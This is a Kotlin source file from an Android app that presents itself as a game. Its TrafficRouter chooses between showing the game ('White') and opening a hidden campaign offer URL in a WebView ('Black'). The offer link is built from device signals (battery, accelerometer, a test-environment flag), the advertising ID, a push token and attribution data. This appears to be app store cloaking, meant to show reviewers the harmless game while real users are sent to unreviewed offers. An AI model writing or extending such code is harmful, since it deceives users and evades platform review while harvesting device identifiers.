package com.chickierunway.game.integration

import android.os.Handler
import android.os.Looper
import com.chickierunway.game.BuildConfig
import java.util.concurrent.Executors

/**
 * Decides White/Black without any network probe of its own. A pinned branch or a fresh cached
 * address is answered instantly; otherwise it builds the campaign link, and the WebView that opens
 * it is the single click that lets the tracker decide (see OfferWebViewClient).
 */
object TrafficRouter {

    private val executor = Executors.newSingleThreadExecutor()
    private val mainHandler = Handler(Looper.getMainLooper())

    fun route(onResult: (RouteDecision) -> Unit) {
        // A pinned White answers without the network, so relaunches are instant and can never
        // flip the user to the offer.
        if (IntegrationStorage.isWhiteLocked) {
            deliver(RouteDecision.White, onResult)
            return
        }
        // A still-fresh cached address short-circuits the campaign link for 24h.
        IntegrationStorage.freshOfferUrl()?.let {
            deliver(RouteDecision.Black(it, fromCache = true), onResult)
            return
        }
        if (BuildConfig.OFFER_BASE_URL.isBlank()) {
            // Nothing to open: White for now, but pin nothing so a build with a URL still asks.
            deliver(RouteDecision.White, onResult)
            return
        }

        executor.execute {
            val url = buildOfferUrl()
            deliver(
                if (url.isBlank()) RouteDecision.White else RouteDecision.Black(url, fromCache = false),
                onResult
            )
        }
    }

    /**
     * Background thread only: AccelerometerProbe.await(), GaidProbe.await() and
     * PushManager.awaitToken() block for up to a few seconds each. Called from the executor in route().
     */
    fun buildOfferUrl(): String = OfferUrlBuilder.build(
        baseUrl = BuildConfig.OFFER_BASE_URL,
        // The whole map. Hand-picking campaign/network here compiles, runs, and quietly loses
        // parameters the moment Adjust adds a field.
        attribution = IntegrationStorage.attributionParams,
        adid = IntegrationStorage.adid,
        extraParams = buildList {
            add("sub12" to DeviceSignals.battery)
            add("sub13" to AccelerometerProbe.await())
            add("sub14" to DeviceSignals.isTestEnvironment.toString())
            // Through extras, not like adid: it must go out always, empty included.
            add("gps_adid" to GaidProbe.await())
            add("push_token" to PushManager.awaitToken())
        },
        sub1InPath = BuildConfig.OFFER_ROUTING == "prily",
    )

    private fun deliver(decision: RouteDecision, onResult: (RouteDecision) -> Unit) {
        mainHandler.post { onResult(decision) }
    }
}
